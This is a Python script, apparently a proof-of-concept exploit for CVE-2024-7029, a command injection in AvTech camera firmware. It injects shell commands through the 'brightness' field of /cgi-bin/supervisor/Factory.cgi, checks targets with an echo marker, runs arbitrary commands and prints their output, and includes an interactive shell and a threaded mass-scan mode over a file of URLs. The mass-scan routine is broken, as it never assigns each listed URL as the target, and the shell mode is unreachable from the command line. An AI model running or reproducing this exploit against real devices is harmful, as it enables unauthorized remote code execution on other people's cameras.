#!/usr/bin/env python3

import requests
import argparse
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.formatted_text import HTML
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# Disable warnings about insecure HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class AvTechExploit:
    def __init__(self, target=None, target_file=None, threads=10):
        self.target = target
        self.target_file = target_file
        self.threads = threads
        self.cmd = ""
        self.path = '/cgi-bin/supervisor/Factory.cgi'
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    def CheckVuln(self):
        test = f'action=white_led&brightness=$(echo%20GDHAiwhsHWhswHSKA 2>&1) #'
        try:
            resp = requests.post(self.target + self.path, headers=self.headers, data=test, timeout=10, verify=False)
            if "GDHAiwhsHWhswHSKA" in resp.text:
                print(f"[+] The target is vulnerable: {self.target}")
                return True
        except requests.RequestException as e:
            print(f"[-] Request failed: {e}")
        return False

    def MainExploit(self):
        data = f'action=white_led&brightness=$({self.cmd} 2>&1) #'
        print("[*] Checking if the target is vulnerable")
        if not self.CheckVuln():
            print("[-] Target is not vulnerable or cannot be reached")
            return

        try:
            resp = requests.post(self.target + self.path, headers=self.headers, data=data, timeout=10, verify=False)
            if resp.status_code == 200:
                print(f"[*] Command output:\n{resp.text}")
            else:
                print(f"[-] Exploitation failed with status code {resp.status_code}")
        except requests.RequestException as e:
            print(f"[-] Error during exploitation: {e}")

    def InteractiveShell(self):
        print("[*] Initiating interactive shell")
        session = PromptSession(history=InMemoryHistory())
        print("[+] Interactive shell opened successfully")
        while True:
            try:
                cmd = session.prompt(HTML("<ansiyellow><b>Shell> </b></ansiyellow>"), default="").strip()
                if cmd.lower() == "exit":
                    break
                elif cmd.lower() == "clear":
                    self.clear_console()
                    continue
                self.cmd = cmd
                self.MainExploit()
            except KeyboardInterrupt:
                print("[-] Exiting interactive shell")
                break

    def ScanFile(self):
        try:
            with open(self.target_file, 'r') as file:
                targets = [line.strip() for line in file.readlines()]
            with alive_bar(len(targets), title='Scanning Targets', bar="smooth", enrich_print=False) as bar:
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    futures = {executor.submit(self.CheckVuln): target for target in targets}
                    for future in as_completed(futures):
                        bar()
        except Exception as e:
            print(f"[-] Error scanning from file: {e}")

    def ScanTarget(self, target):
        self.target = target
        self.MainExploit()

    def clear_console(self):
        os.system('cls' if os.name == 'nt' else 'clear')

def main():
    parser = argparse.ArgumentParser(description="A PoC exploit for CVE-2024-7029 - AvTech Remote Code Execution (RCE)")
    parser.add_argument("-u", "--url", type=str, help="Target URL to exploit")
    parser.add_argument("-f", "--file", type=str, help="File containing target URLs")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads for scanning")

    args = parser.parse_args()

    if args.url:
        exploit = AvTechExploit(target=args.url, threads=args.threads)
        exploit.MainExploit()
    elif args.file:
        exploit = AvTechExploit(target_file=args.file, threads=args.threads)
        exploit.ScanFile()
    else:
        print("[-] Please specify a target URL or a file containing URLs.")
        parser.print_help()

if __name__ == "__main__":
    main()
